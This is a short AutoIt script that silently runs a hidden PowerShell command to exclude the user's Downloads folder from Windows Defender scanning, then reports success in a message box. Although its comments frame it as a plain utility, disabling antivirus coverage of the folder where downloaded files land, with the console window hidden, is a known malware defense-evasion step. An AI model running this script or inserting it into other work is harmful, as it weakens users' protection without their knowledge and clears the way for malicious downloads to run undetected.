#include <MsgBoxConstants.au3>

; Function to add an exclusion to Windows Defender
Func AddDefenderExclusion($sFolderPath)
    ; Escaping the folder path for PowerShell
    $sFolderPath = '"' & $sFolderPath & '"'

    ; PowerShell command to add the exclusion
    $sCommand = "Add-MpPreference -ExclusionPath " & $sFolderPath

    ; Execute the PowerShell command
    Run(@ComSpec & " /c powershell -Command " & $sCommand, "", @SW_HIDE)

    ; Check for errors
    If @error Then
        MsgBox($MB_ICONERROR, "Error", "Failed to add exclusion.")
    Else
        MsgBox($MB_ICONINFORMATION, "Success", "Exclusion added successfully.")
    EndIf
EndFunc

; Path to the Downloads folder, typically under the user profile
$sDownloadsPath = @UserProfileDir & "\Downloads"

; Add an exclusion for the Downloads folder
AddDefenderExclusion($sDownloadsPath)
